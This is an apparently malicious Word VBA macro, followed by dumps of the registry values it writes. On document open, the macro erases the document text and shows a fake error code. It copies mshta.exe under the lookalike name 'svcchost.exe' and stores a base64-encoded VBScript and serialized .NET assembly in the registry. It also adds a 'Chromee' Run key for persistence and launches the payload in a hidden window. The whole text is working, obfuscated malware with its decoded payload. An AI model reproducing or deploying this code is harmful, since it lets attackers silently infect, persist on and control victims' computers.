    app = app & "UUJVWlhKdGFXNWhkR1VBVm1seWRIVmhiRTFsYlc5eWVWZHlhWFJsQUVkMSIKcyA9IHMgJiAiYVdSQmRIUnlhV0oxZEdVQVJHVmlk"
    app = app & "V2RuWVdKc1pVRjBkSEpwWW5WMFpRQkRiMjFXYVhOcFlteGxRWFIwY21saWRYUmxBRUZ6YzJWdCIKcyA9IHMgJiAiWW14NVZHbDBi"
    app = app & "R1ZCZEhSeWFXSjFkR1VBUVhOelpXMWliSGxVY21Ga1pXMWhjbXRCZEhSeWFXSjFkR1VBWkhkR2FXeHNRWFIwY21saSIKcyA9IHMg"
    app = app & "JiAiZFhSbEFFRnpjMlZ0WW14NVJtbHNaVlpsY25OcGIyNUJkSFJ5YVdKMWRHVUFRWE56WlcxaWJIbERiMjVtYVdkMWNtRjBhVzl1"
    app = app & "UVhSMCIKcyA9IHMgJiAiY21saWRYUmxBRUZ6YzJWdFlteDVSR1Z6WTNKcGNIUnBiMjVCZEhSeWFXSjFkR1VBUm14aFozTkJkSFJ5"
    app = app & "YVdKMWRHVUFRMjl0Y0dscyIKcyA9IHMgJiAiWVhScGIyNVNaV3hoZUdGMGFXOXVjMEYwZEhKcFluVjBaUUJCYzNObGJXSnNlVkJ5"
    app = app & "YjJSMVkzUkJkSFJ5YVdKMWRHVUFRWE56WlcxaSIKcyA9IHMgJiAiYkhsRGIzQjVjbWxuYUhSQmRIUnlhV0oxZEdVQVFYTnpaVzFp"
    app = app & "YkhsRGIyMXdZVzU1UVhSMGNtbGlkWFJsQUZKMWJuUnBiV1ZEYjIxdyIKcyA9IHMgJiAiWVhScFltbHNhWFI1UVhSMGNtbGlkWFJs"
    app = app & "QUdSM1dGTnBlbVVBWkhkWlUybDZaUUJuWlhSZlUybDZaUUJoY21Ob1UybDZaUUJrZDFOMCIKcyA9IHMgJiAiWVdOclUybDZaUUJ1"
    app = app & "VTJsNlpRQmtkMU5wZW1VQVUzbHVZMmh5YjI1cGVtVUFjMmw2WlFCSmJtUmxlRTltQUVaeWIyMUNZWE5sTmpSVCIKcyA9IHMgJiAi"
    app = app & "ZEhKcGJtY0FVM1ZpYzNSeWFXNW5BRTFoY25Ob1lXd0FRV3hzQUd0bGNtNWxiRE15TG1Sc2JBQnNiMkZrWlhJdVpHeHNBRXh2WVdS"
    app = app & "VCIKcyA9IHMgJiAiYUdWc2JBQndZWEpoYlFCblpYUmZTWFJsYlFCVGVYTjBaVzBBUlc1MWJRQnNjRTUxYldKbGNrOW1RbmwwWlhO"
    app = app & "WGNtbDBkR1Z1QUZGMSIKcyA9IHMgJiAiWlhKNVRHbHRhWFJsWkVsdVptOXliV0YwYVc5dUFHeHdVSEp2WTJWemMwbHVabTl5YldG"
    app = app & "MGFXOXVBRk5sZEVsdVptOXliV0YwYVc5dSIKcyA9IHMgJiAiQUZGMVpYSjVTVzVtYjNKdFlYUnBiMjRBVm1seWRIVmhiRTFsYlc5"
    app = app & "eWVVOXdaWEpoZEdsdmJnQlRlWE4wWlcwdVVtVm1iR1ZqZEdsdiIKcyA9IHMgJiAiYmdCUWNtOWpaWE56VkdoeVpXRmtRMjlzYkdW"
    app = app & "amRHbHZiZ0JYYjNjMk5FUnBjMkZpYkdWWGIzYzJORVp6VW1Wa2FYSmxZM1JwYjI0QSIKcyA9IHMgJiAiVjI5M05qUlNaWFpsY25S"
    app = app & "WGIzYzJORVp6VW1Wa2FYSmxZM1JwYjI0QWJIQlRkR0Z5ZEhWd1NXNW1id0JhWlhKdkFHeHdSR1Z6YTNSdiIKcyA9IHMgJiAiY0FC"
    app = app & "c2NGTjBZWEowUVdSa2NnQnNiMkZrWlhJQWJIQkNkV1ptWlhJQVZHOU1iM2RsY2dCb1UzUmtSWEp5YjNJQUxtTjBiM0lBTG1OaiIK"
    app = app & "cyA9IHMgJiAiZEc5eUFFbHVkRkIwY2dCd2RISUFVM2x6ZEdWdExrUnBZV2R1YjNOMGFXTnpBR2RsZEY5VWFISmxZV1J6QUdSM1RX"
    app = app & "bHNiR2x6WldOdiIKcyA9IHMgJiAiYm1SekFGTjVjM1JsYlM1U2RXNTBhVzFsTGtsdWRHVnliM0JUWlhKMmFXTmxjd0JUZVhOMFpX"
    app = app & "MHVVblZ1ZEdsdFpTNURiMjF3YVd4bCIKcyA9IHMgJiAiY2xObGNuWnBZMlZ6QUVSbFluVm5aMmx1WjAxdlpHVnpBR0pKYm1obGNt"
    app = app & "bDBTR0Z1Wkd4bGN3QnNjRlJvY21WaFpFRjBkSEpwWW5WMCIKcyA9IHMgJiAiWlhNQWJIQlFjbTlqWlhOelFYUjBjbWxpZFhSbGN3"
    app = app & "QlFjbTlqWlhOelEzSmxZWFJwYjI1R2JHRm5jd0JrZDBOeVpXRjBhVzl1Um14aCIKcyA9IHMgJiAiWjNNQVVISnZZMlZ6YzBGalky"
    app = app & "VnpjMFpzWVdkekFHUjNSbXhoWjNNQVpIZFlRMjkxYm5SRGFHRnljd0JrZDFsRGIzVnVkRU5vWVhKeiIKcyA9IHMgJiAiQUZSbGMz"
    app = app & "UkRiR0Z6Y3dCVWFISmxZV1JCWTJObGMzTUFaSGRFWlhOcGNtVmtRV05qWlhOekFFTnlaV0YwWlZCeWIyTmxjM01BYUZCeSIKcyA9"
    app = app & "IHMgJiAiYjJObGMzTUFSMlYwUTNWeWNtVnVkRkJ5YjJObGMzTUFiSEJDWVhObFFXUmtjbVZ6Y3dCc2NFRmtaSEpsYzNNQWJIQlRk"
    app = app & "R0Z5ZEVGayIKcyA9IHMgJiAiWkhKbGMzTUFWMkZwZEVadmNsTnBibWRzWlU5aWFtVmpkQUJKYm1wbFkzUUFiSEJtYkU5c1pGQnli"
    app = app & "M1JsWTNRQVpteFFjbTkwWldOMCIKcyA9IHMgJiAiQUdac1RtVjNVSEp2ZEdWamRBQkZlR2wwQUd4d1JXNTJhWEp2Ym0xbGJuUUFV"
    app = app & "M1JoY25RQVEyOXVkbVZ5ZEFCb1UzUmtTVzV3ZFhRQSIKcyA9IHMgJiAiYUZOMFpFOTFkSEIxZEFCM1UyaHZkMWRwYm1SdmR3QnVR"
    app = app & "MjFrVTJodmR3QldhWEowZFdGc1FXeHNiMk5GZUFCV2FYSjBkV0ZzVUhKdiIKcyA9IHMgJiAiZEdWamRFVjRBRU52Y0hrQVYzSnBk"
    app = app & "R1ZRY205alpYTnpUV1Z0YjNKNUFHeHdRM1Z5Y21WdWRFUnBjbVZqZEc5eWVRQUFBQUFSY3dCNSIKcyA9IHMgJiAiQUhNQWR3QnZB"
    app = app & "SGNBTmdBMEFBQVJjd0I1QUhNQWRBQmxBRzBBTXdBeUFBQUFBQUNONm5ocGpFYkRRcDFRcWE5UjZTMUlBQVFnQVFFSSIKcyA9IHMg"
    app = app & "JiAiQXlBQUFRVWdBUUVSRVFRZ0FRRU9CQ0FCQVFJREJ3RVlBZ1lZRHdjSkhRVVJHQkVVR0JnSkVrRVlEZ01BQUFnRkFBRWRCUTRG"
    app = app & "QUFFUyIKcyA9IHMgJiAiV1FnRUlBQVNRUVVnQVJKZENBTWdBQWdEQUFBT0JDQUJDQU1FSUFFT0NBUUFBQkpaQkNBQUVta0RJQUFP"
    app = app & "QlNBQ0RnNE9CZ0FDRWxrTyIKcyA9IHMgJiAiRGdRQUFRRUlDQWNGSFFVWUNSZ09DQUFFQVIwRkNCZ0lDTGQ2WEZZWk5PQ0pCUDhQ"
    app = app & "SHdBRUFRQUFBQVFDQUFBQUJBZ0FBQUFFRUFBQSIKcyA9IHMgJiAiQUFRZ0FBQUFCRUFBQUFBRWdBQUFBQVFBQVFBQUJBQUNBQUFF"
    app = app & "QUFRQUFBUUFFQUFBQkFBQUVBQUVBQUFBQUFRQUFBQUJCQUFBQUFRRSIKcyA9IHMgJiAiQUFBQUNBUUFBQVFBQkFBQUFBSUVCQUFB"
    app = app & "QUFRQUFBZ0FCQUFBQVFBQ0Jna0RCaEVNQXdZUkVBSUdEZ0lHQmdJR0NBTUdFUndHSUFNQiIKcyA9IHMgJiAiRGc0SUJTQUNBUTRJ"
    app = app & "QlFBQ0NnNElCUUFCQWhBWUJBQUJBaGdIQUFRWUdBa0pDUVlBQXdJWUNRa0tBQVlZQ1FrWUdBa1FDUVVBQWdrWSIKcyA9IHMgJiAi"
    app = app & "Q1FjQUF4Z1JIQUlJQ2dBRkFoZ1lIUVVJRUJnR0FBTVlHQmdZQ0FBRkdCZ1lDQWtKQ1FBRkFoZ1lDQWtRQ1JJQUNnSU9EaGdZQWhF"
    app = app & "USIKcyA9IHMgJiAiR0E0UUVSZ1FFUlFFQUFFSkdBTUFBQUVJQVFBSUFBQUFBQUFlQVFBQkFGUUNGbGR5WVhCT2IyNUZlR05sY0hS"
    app = app & "cGIyNVVhSEp2ZDNNQiIKcyA9IHMgJiAiQ0FFQUFnQUFBQUFBQ3dFQUJteHZZV1JsY2dBQUJRRUFBQUFBRndFQUVrTnZjSGx5YVdk"
    app = app & "b2RDRENxU0FnTWpBeE53QUFLUUVBSkRVNSIKcyA9IHMgJiAiWVdReE5XUXlMVFl5T0RBdE5EQmtOQzFpTXpBMkxUUTVZMkl3WW1W"
    app = app & "aU16SmtNQUFBREFFQUJ6RXVNQzR3TGpBQUFBVUJBQUVBQUFBQSIKcyA9IHMgJiAiQUFBQUFMcTNkbGtBQUFBQUFnQUFBQndCQUFC"
    app = app & "SU9BQUFTQm9BQUZKVFJGTm83d1FFNXBYY1Q0bnF3azdaSXowc0FRQUFBRVU2WEhCeSIKcyA9IHMgJiAiYVhaY1puSmhiV1YzYjNK"
    app = app & "clhHTnZaR1ZjZEc5dmJITmNaWGhsTW1welhHeHZZV1JsY2x4dlltcGNVbVZzWldGelpWeHNiMkZrWlhJdSIKcyA9IHMgJiAiY0dS"
    app = app & "aUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIK"
    app = app & "cyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBakRrQUFB"
    app = app & "QUFBQUFBQUFBQXBqa0FBQUFnQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUpnNUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFYME52Y2tSc2JFMWhhVzRBYlhOamIzSmxaUzVrYkd3QUFBQUFBUDhsQUNBQSIKcyA9IHMgJiAiRUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUJBQUFBQVlBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUVBQUFBdyIKcyA9"
    app = app & "IHMgJiAiQUFDQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQklBQUFBV0VBQUFBd0RBQUFBQUFBQUFBQUFBQXdETkFBQUFGWUFV"
    app = app & "d0JmQUZZQSIKcyA9IHMgJiAiUlFCU0FGTUFTUUJQQUU0QVh3QkpBRTRBUmdCUEFBQUFBQUM5Qk8vK0FBQUJBQUFBQVFBQUFBQUFB"
    app = app & "QUFCQUFBQUFBQS9BQUFBQUFBQSIKcyA9IHMgJiAiQUFRQUFBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQVJBQUFBQUVBVmdCaEFISUFS"
    app = app & "Z0JwQUd3QVpRQkpBRzRBWmdCdkFBQUFBQUFrQUFRQSIKcyA9IHMgJiAiQUFCVUFISUFZUUJ1QUhNQWJBQmhBSFFBYVFCdkFHNEFB"
    app = app & "QUFBQUFBQXNBUnNBZ0FBQVFCVEFIUUFjZ0JwQUc0QVp3QkdBR2tBYkFCbCIKcyA9IHMgJiAiQUVrQWJnQm1BRzhBQUFCSUFnQUFB"
    app = app & "UUF3QURBQU1BQXdBREFBTkFCaUFEQUFBQUFhQUFFQUFRQkRBRzhBYlFCdEFHVUFiZ0IwQUhNQSIKcyA9IHMgJiAiQUFBQUFBQUFJ"
    app = app & "Z0FCQUFFQVF3QnZBRzBBY0FCaEFHNEFlUUJPQUdFQWJRQmxBQUFBQUFBQUFBQUFOZ0FIQUFFQVJnQnBBR3dBWlFCRSIKcyA9IHMg"
    app = app & "JiAiQUdVQWN3QmpBSElBYVFCd0FIUUFhUUJ2QUc0QUFBQUFBR3dBYndCaEFHUUFaUUJ5QUFBQUFBQXdBQWdBQVFCR0FHa0FiQUJs"
    app = app & "QUZZQSIKcyA9IHMgJiAiWlFCeUFITUFhUUJ2QUc0QUFBQUFBREVBTGdBd0FDNEFNQUF1QURBQUFBQTJBQXNBQVFCSkFHNEFkQUJs"
    app = app & "QUhJQWJnQmhBR3dBVGdCaCIKcyA9IHMgJiAiQUcwQVpRQUFBR3dBYndCaEFHUUFaUUJ5QUM0QVpBQnNBR3dBQUFBQUFFZ0FFZ0FC"
    app = app & "QUV3QVpRQm5BR0VBYkFCREFHOEFjQUI1QUhJQSIKcyA9IHMgJiAiYVFCbkFHZ0FkQUFBQUVNQWJ3QndBSGtBY2dCcEFHY0FhQUIw"
    app = app & "QUNBQXFRQWdBQ0FBTWdBd0FERUFOd0FBQUNvQUFRQUJBRXdBWlFCbiIKcyA9IHMgJiAiQUdFQWJBQlVBSElBWVFCa0FHVUFiUUJo"
    app = app & "QUhJQWF3QnpBQUFBQUFBQUFBQUFQZ0FMQUFFQVR3QnlBR2tBWndCcEFHNEFZUUJzQUVZQSIKcyA9IHMgJiAiYVFCc0FHVUFiZ0Jo"
    app = app & "QUcwQVpRQUFBR3dBYndCaEFHUUFaUUJ5QUM0QVpBQnNBR3dBQUFBQUFDNEFCd0FCQUZBQWNnQnZBR1FBZFFCaiIKcyA9IHMgJiAi"
    app = app & "QUhRQVRnQmhBRzBBWlFBQUFBQUFiQUJ2QUdFQVpBQmxBSElBQUFBQUFEUUFDQUFCQUZBQWNnQnZBR1FBZFFCakFIUUFWZ0JsQUhJ"
    app = app & "QSIKcyA9IHMgJiAiY3dCcEFHOEFiZ0FBQURFQUxnQXdBQzRBTUFBdUFEQUFBQUE0QUFnQUFRQkJBSE1BY3dCbEFHMEFZZ0JzQUhr"
    app = app & "QUlBQldBR1VBY2dCeiIKcyA9IHMgJiAiQUdrQWJ3QnVBQUFBTVFBdUFEQUFMZ0F3QUM0QU1BQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFB"
    app = app & "d0FBQU1BQUFBdURrQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIK"
    app = app & "cyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9"
    app = app & "IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQVEwQUFBQUVBQUFBQ1JjQUFBQUpCZ0FBQUFrV0FBQUFCaG9BQUFBblUzbHpk"
    app = app & "R1Z0TGxKbFpteGxZM1JwYjI0dSIKcyA9IHMgJiAiUVhOelpXMWliSGtnVEc5aFpDaENlWFJsVzEwcENBQUFBQW9MIgplbnRyeV9j"
    app = app & "bGFzcyA9ICJUZXN0Q2xhc3MiCkRpbSBmbXQsIGFsLCBkLCBvClNldCBmbXQgPSBDcmVhdGVPYmplY3QoIlN5c3RlbS5SdW50aW1l"
    app = app & "LlNlcmlhbGl6YXRpb24uRm9ybWF0dGVycy5CaW5hcnkuQmluYXJ5Rm9ybWF0dGVyIikKU2V0IGFsID0gQ3JlYXRlT2JqZWN0KCJT"
    app = app & "eXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0IikKYWwuQWRkIGZtdC5TdXJyb2dhdGVTZWxlY3RvcgpTZXQgZCA9IGZtdC5EZXNl"
    app = app & "cmlhbGl6ZV8yKEJhc2U2NFRvU3RyZWFtKHMpKQpTZXQgbyA9IGQuRHluYW1pY0ludm9rZShhbC5Ub0FycmF5KCkpLkNyZWF0ZUlu"
    app = app & "c3RhbmNlKGVudHJ5X2NsYXNzKQpEaW0gb2JqU2hlbGwsc2hsClNldCBvYmpTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5T"
    app = app & "aGVsbCIpCnNobCA9IHNobCAmIG9ialNoZWxsLlJlZ1JlYWQoIkhLQ1VcU29mdHdhcmVcQXBwRGF0YUxvd1xEYXRhQXBwXERhdGEi"
    app = app & "KSAKby5Mb2FkU2hlbGwgc2hsLCA0CkVuZCBTdWIKU2V0VmVyc2lvbgonT24gRXJyb3IgUmVzdW1lIE5leHQKUnVuCg=="


    Dim decode
    decode = Base64Decode(app)
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.RegWrite "HKCU\Software\AppDataLow\DataApp\App", decode, "REG_SZ"
    
End Function
Function checkEnviroment()
    Dim arcPath As String
    arcPath = arcPath & "C:\\Windows\\SysWOW64"
    If dirExists(arcPath) = True Then
        FileCopy "C:\Windows\SysWOW64\mshta.exe", "C:\ProgramData\svcchost.exe"
    Else
        FileCopy "C:\Windows\System32\mshta.exe", "C:\ProgramData\svcchost.exe"
    End If
End Function

Function addKeyApp()
    Dim key, decodeKey
    key = key & "QzpcUHJvZ3JhbURhdGFcc3ZjY2hvc3QuZXhlIHZic2NyaXB0OmV4ZWN1dGUoIk9uIEVycm9yIFJlc3VtZSBOZXh0OnNldCBXID0g"
    key = key & "Q3JlYXRlT2JqZWN0KCIiV1NjcmlwdC5TaGVsbCIiKTpzPSIiIiI6bSA9IFcuUmVnUmVhZCgiIkhLQ1VcU29mdHdhcmVcQXBwRGF0"
    key = key & "YUxvd1xEYXRhQXBwXEFwcCIiKTpleGVjdXRlKG0pOmNvZGUgY2xvc2UiKQ=="


    decodeKey = Base64Decode(key)
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Chromee", decodeKey, "REG_SZ"
End Function
Function runApp()
    Dim key
    Dim myWS As Object
    Set myWS = CreateObject("WScript.Shell")
    key = myWS.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Chromee")
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
    errReturn = objProcess.Create(key, Null, objConfig, intProcessID)
End Function

Function Base64Decode(ByVal base64String)
  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim dataLength, sOut, groupBegin
  
  base64String = Replace(base64String, vbCrLf, "")
  base64String = Replace(base64String, vbTab, "")
  base64String = Replace(base64String, " ", "")
  
  dataLength = Len(base64String)
  If dataLength Mod 4 <> 0 Then
    Err.Raise 1, "Base64Decode", "Bad Base64 string."
    Exit Function
  End If

  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    numDataBytes = 3
    nGroup = 0

    For CharCounter = 0 To 3

      thisChar = Mid(base64String, groupBegin + CharCounter, 1)

      If thisChar = "=" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then
        Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
        Exit Function
      End If

      nGroup = 64 * nGroup + thisData
    Next
    
    nGroup = Hex(nGroup)
    
    nGroup = String(6 - Len(nGroup), "0") & nGroup
    
    pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 5, 2)))
    
    sOut = sOut & Left(pOut, numDataBytes)
  Next

  Base64Decode = sOut
End Function
Function dirExists(s_directory As String) As Boolean
    Set OFSO = CreateObject("Scripting.FileSystemObject")
    dirExists = OFSO.FolderExists(s_directory)
End Function
Function IsProcessRunning(strComputer, strProcess)
    Dim Process, strObject
    IsProcessRunning = False
    strObject = "winmgmts://" & strComputer
    For Each Process In GetObject(strObject).InstancesOf("win32_process")
    If UCase(Process.Name) = UCase(strProcess) Then
        IsProcessRunning = True
        Exit Function
    End If
    Next
End Function
Function ReplaceDocument()
    ActiveDocument.Range.Delete
    ActiveDocument.Range.Text = "Errx000000762EMSF"
    ActiveDocument.Save
End Function
Sub Main()
    checkEnviroment
    addApp
    addData
    addKeyApp
    runApp
End Sub
Private Sub Document_Open()
    Dim strComputer, strProcess
    strComputer = "."
    strProcess = "svcchost.exe"
    If IsProcessRunning(strComputer, strProcess) = False Then
        ReplaceDocument
        Main
    End If
End Sub

## Contents of HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Chromee

C:\ProgramData\svcchost.exe vbscript:execute("On Error Resume Next:set W = CreateObject(""WScript.Shell""):s="""":m = W.RegRead(""HKCU\Software\AppDataLow\DataApp\App""):execute(m):code close")

## Contents of HKEY_CURRENT_USER\Software\AppDataLow\DataApp\App

AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy
AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph
dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk
ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD
AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl
RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU
eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl
cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90
aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu
MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH
dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA
ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw
B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu
dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA
CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u
SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5
cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR
AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA
AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y
bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh
NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz
ZW1ibHkGFwAAAARMb2FkCg8MAAAAACIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy
YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAu7d2WQAAAAAA
AAAA4AAiIAsBMAAAGgAAAAYAAAAAAAC2OQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA
AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAZDkA
AE8AAAAAQAAAaAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAACw4AAAcAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA
AAAALnRleHQAAAC8GQAAACAAAAAaAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAaAMAAABA
AAAABAAAABwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAgAAAAAAAAAAAA
AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAJg5AAAAAAAASAAAAAIABQDYIgAAVBUAAAEAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzABABUAAAAB
AAARAigPAAAKfhAAAAoKEgAoBQAABiYqAAAAEzAKAFoBAAACAAARKBEAAAoFLgYFOtAAAAADKBIA
AAoKEgH+FQYAAAISAv4VBQAAAhQEfhAAAAp+EAAAChYgBAAACH4QAAAKFBIBEgIoEAAABiYIeyQA
AAR+EAAACgaOaX4BAAAEfgIAAAQoDgAABg1+EAAAChMECHskAAAECQYGjmkSBCgMAAAGJhYTBQh7
